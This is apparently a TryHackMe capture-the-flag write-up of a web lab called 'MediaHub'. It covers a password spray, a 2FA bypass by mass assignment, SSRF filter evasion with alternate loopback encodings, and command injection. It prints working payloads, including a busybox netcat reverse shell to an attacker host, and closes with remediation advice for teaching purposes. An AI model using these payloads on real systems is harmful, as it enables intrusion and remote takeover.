# TryHackMe — Interceptor (MediaHub)

> **Category:** Web Application / API Abuse
> **Difficulty:** Medium
> **Skills:** SSRF filter bypass, OS command injection, authentication-flow abuse (mass assignment), source-backup disclosure, incomplete-filter analysis

MediaHub presents itself as an internal portal for journalists. The real story is in how the front end talks to its back-end APIs: the access controls live in the wrong layer, and a series of small request changes walks an unauthenticated visitor all the way to remote code execution.

---

## 1. Reconnaissance

### 1.1 Port scan

```bash
nmap -sC -sV -p- <target>.thm
```

| Port | Service | Note |
|------|---------|------|
| 22   | OpenSSH 8.2p1 | Foothold candidate for later |
| 53   | ISC BIND 9.16.1 | Unusual for a "simple portal" — investigated first |
| 80   | Apache 2.4.41 / PHP (MediaHub) | `PHPSESSID`, server-side sessions |

The DNS service stood out. An internal portal running its own authoritative resolver hinted at a hidden API host, so that lead was chased before the web app.

### 1.2 DNS — dead end (verified, not assumed)

```bash
dig axfr <domain> @<target>      # Transfer failed
dig SOA  <domain> @<target>      # status: REFUSED
dig NS   <domain> @<target>      # status: REFUSED
```

`REFUSED` + `recursion requested but not available` means the server intentionally refuses to serve this zone to arbitrary clients. **Key discipline:** a negative result is only trustworthy once you confirm you asked the right question. Here the SOA/NS refusal proved the DNS vector was closed by design, not that subdomains were absent. Vector abandoned deliberately.

### 1.3 Content discovery — the soft-404 trap

Directory brute-forcing failed immediately:

```
=> 200 (Length: 1491) for a random UUID path
```

The server returns **HTTP 200 with a fixed 1491-byte stub for any non-existent path** (a wildcard / soft-404). Status code is useless as a signal here — everything is `200`. The fix is to filter on **response size**, using the stub length as a baseline:

```bash
ffuf -u http://<target>/FUZZ \
  -w directory-list-2.3-medium.txt \
  -e .php,.txt,.bak,.js,.json,.old -fs 1491 -t 60
```

> **Lesson:** on a wildcard host, tools that filter by status code (gobuster default) structurally cannot work. Switch to `ffuf -fs/-fw` or `feroxbuster -S` and filter by size/words. The baseline number (`1491`) appeared in the very first error log — that was the signal to change tooling.

**Findings (size ≠ 1491):**

| Path | Meaning |
|------|---------|
| `api_login.php` | Auth step 1 (returns JSON) |
| `otp.php` / `verify_otp.php` | Two-factor step |
| `dashboard.php` | Post-auth area (302 without session) |
| `config.php` | 0 bytes — secrets inside PHP tags |
| `search.php`, `uploads/` (listing on), `phpmyadmin/` | Secondary surface |
| **`login.php.bak`** | **2038 bytes — backup source disclosure** |

---

## 2. Credential Discovery — Source Backup

`login.php.bak` is served as text (PHP not executed). Inside, a developer note:

```php
/*
| Admin test account for staging environment
| Email: admin@mediahub.thm
| Admin password follows company format: MediaHub + any year
| TODO: remove before production deployment
*/
```

Password space is tiny — `MediaHub` + a 4-digit year. Sprayed against `api_login.php`, filtering out the known `Invalid credentials` response:

```bash
for y in $(seq 1990 2026); do
  r=$(curl -s -c cookies.txt http://<target>/api_login.php \
        --data-urlencode "email=admin@mediahub.thm" \
        --data-urlencode "password=MediaHub$y")
  echo "$r" | grep -q "Invalid" || echo "HIT $y -> $r"
done
```

**Result:**

```
HIT 2026 -> {"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
```

> Credentials: `admin@mediahub.thm` / `MediaHub2█████` (partially masked).

Note: the response advances to a **second factor**, so the password alone is not enough.

---

## 3. Bypassing 2FA — Mass Assignment

With a valid first-factor session, `otp.php` renders a form posting `otp` (6 digits) to `verify_otp.php`. A wrong code returns:

```json
{"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
```

The server **leaks its internal state variable** (`is_verified`) in the response. The instinct to "flip it to true" is right, but the direction matters: editing the *response* only fools the front end, and `dashboard.php` trusts the server-side session, not the DOM. The correct move is to send `is_verified` in the **request** and see whether the endpoint trusts a client-supplied field:

```bash
curl -s -b cookies.txt http://<target>/verify_otp.php \
  --data-urlencode "otp=000000" --data-urlencode "is_verified=true"
```

**Result:**

```json
{"ok":true,"message":"OTP verified. Redirecting..."}
```

The OTP check is skipped entirely — a classic **mass assignment** flaw. The server accepts a parameter it should never trust from the client.

> **Lesson:** change the *request* (what the server processes), not the *response* (what the server already decided).

---

## 4. Admin Dashboard — First Flag

`dashboard.php` now loads with the full session:

```
Flag: THM{ADMIN_ACCESS_USING_B███}
```

Profile shows `Role: admin`, `Verified: Yes`. Two functional sinks appear:

- **Change Profile Picture** → `upload_profile.php` (upload → `uploads/`, future RCE path)
- **Import Feed** → `import_feed_api.php` — *"the server fetches [a URL] and returns the raw output"*

The Import Feed front-end JS applies `url.replace(/[;&|]/g,'')` — a **client-side only** filter. Since we talk to the API directly, that filter never applies.

---

## 5. SSRF → Command Injection

### 5.1 Mapping the filter by its error messages

`import_feed_api.php` runs `curl <url>` as a shell command and returns stdout/stderr in `cmd_output`. With no source backup available, the **error messages themselves are the oracle** — each distinct message reveals a code branch:

| Input | Response | Branch revealed |
|-------|----------|-----------------|
| `file:///etc/passwd` | `Invalid URL` | URL-scheme validator (http/https only) |
| `http://127.0.0.1/` | `Private network access blocked` | Host deny-list (SSRF guard) |
| `http://localhost/` | `Localhost not allowed` | Separate localhost string check |

Two independent gates run **before** execution: a format check, then a private-network host check.

### 5.2 Bypassing the SSRF deny-list

The host check is a **string** comparison against known private forms. Alternate encodings of `127.0.0.1` that `curl` still resolves to loopback slip past it:

```bash
for h in 127.1 2130706433 0x7f000001 0177.0.0.1 0.0.0.0; do
  curl -s -b cookies.txt http://<target>/import_feed_api.php \
    --data-urlencode "url=http://$h/"
done
```

`127.1`, decimal (`2130706433`), hex (`0x7f000001`), octal (`0177.0.0.1`) all **passed** and reached the target's own loopback.

> **Root cause:** the filter validates the *raw string* instead of the *resolved IP*. Proper defence normalizes the host to a numeric address (and pins it against DNS-rebinding) before checking it against private ranges — an allow-list, not a deny-list. Adding more string patterns is a losing game.

### 5.3 Confirming RCE

With a host that passes the filter, command substitution in the path executes:

```bash
curl -s -b cookies.txt http://<target>/import_feed_api.php \
  --data-urlencode 'url=http://127.1/$(id)'
```

The output surfaces inside a `curl: (6) Could not resolve host:` line (spaces in `id`'s output split the argument into "hostnames"):

```
Could not resolve host: gid=33(www-data)
Could not resolve host: groups=33(www-data),1002(findgroup),1003(websql)
```

RCE confirmed as `www-data`. (Non-standard groups `findgroup`/`websql` noted for privilege escalation.)

---

## 6. Second-Layer Filter — and the Real Lesson

A second server-side filter on the command sink strips characters used to pass arguments. Probing one symbol at a time (diagnose, don't guess) established:

| Payload | Result | Conclusion |
|---------|--------|------------|
| `$(id)` | works | bare substitution OK |
| `$(id${IFS}-a)` | blocked | `${IFS}` is filtered |
| `$(id|base64)` | blocked | `\|` is filtered |
| `$(cat${IFS}/etc/hostname)` | blocked | `/` is filtered |
| `$(id$IFS-a)` | **works** | **`$IFS` (no braces) is NOT filtered** |

The filter targets the literal string `${IFS}` but misses the brace-less `$IFS` — a textbook **unanchored / incomplete filter**.

### 6.1 The mistake worth documenting

A large amount of time went into *bypassing* the blocked characters (`$IFS`, `$HOME` to hide slashes, glob tricks, base64, hex). All of it stemmed from insisting on a tool that **needs** those characters — e.g. `bash -i >& /dev/tcp/IP/PORT` requires three `/`.

The winning payload needed **none** of the blocked characters at all:

```
#http://127.1$(busybox nc <ATTACKER_IP> <PORT> -e bash)#
```

- No `/` — `nc -e bash` opens a socket and attaches a shell; it never touches `/dev/tcp/` or any file path.
- No `|` — `-e` is a built-in flag; no piping needed.
- No `${IFS}` — plain spaces between arguments pass fine in this position.
- `busybox` provides an `nc` that ships the `-e` flag (stock Ubuntu netcat often omits it).

> **Core lesson (filter bypass):** first inventory what the channel blocks and what it allows, then choose a payload that fits those constraints **without modification**. Only reach for obfuscation when no clean tool exists. The stronger payload is not the one that hides forbidden characters more cleverly — it's the one that doesn't need them. Reaching for the familiar `/dev/tcp` reverse shell and then patching around the slash filter was solving a harder problem than the box posed.

---

## 7. Shell + Second Flag

```bash
# attacker
nc -nvlp <PORT>

# fire the busybox payload (works identically via curl or the browser form):
curl -s -b cookies.txt http://<target>/import_feed_api.php \
  -F 'url=#http://127.1$(busybox nc <ATTACKER_IP> <PORT> -e bash)#'
```

Connection received. In the shell:

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(findgroup),1003(websql)

cat /var/www/user.txt
# THM{SYSTEM_PWNED_SUCCESS█████}
```

> `-F` sends `multipart/form-data`, exactly reproducing the browser form. Note: `--data-urlencode` re-encodes spaces/`#`, which can alter what reaches the server — a common cause of "works in Burp, fails in curl". Use `-F` or `--data-raw` to send the body raw.

---

## 8. Findings Summary

| # | Vulnerability | Class (OWASP) | Impact |
|---|---------------|---------------|--------|
| 1 | Backup source (`login.php.bak`) served as text | Sensitive Data Exposure / Misconfig | Credential format disclosure |
| 2 | Weak, predictable password format | Identification & Auth Failures | Credential guessing |
| 3 | `is_verified` accepted from client | Broken Access Control (Mass Assignment) | Full 2FA bypass |
| 4 | Directory listing on `uploads/` | Security Misconfiguration | Info disclosure |
| 5 | SSRF host filter validates string, not resolved IP | SSRF (deny-list bypass) | Internal network access |
| 6 | `curl <url>` built via shell concatenation | OS Command Injection | RCE as `www-data` |

## 9. Remediation

- Remove `.bak`/source backups from the web root; enforce strong, non-formulaic passwords.
- Enforce OTP **server-side**; never accept a verification flag from the client.
- Disable Apache directory indexing (`Options -Indexes`).
- SSRF: resolve the host to an IP, check it against private ranges (pin against rebinding), prefer an allow-list of schemes/hosts.
- Command sink: do not build shell strings by concatenation. Use a native HTTP client (PHP cURL extension / `file_get_contents`) with no shell, or pass the URL as a separate argv element via `proc_open` with `escapeshellarg`.

---

*Flags and credentials are partially masked. Lab completed on TryHackMe for educational purposes.*
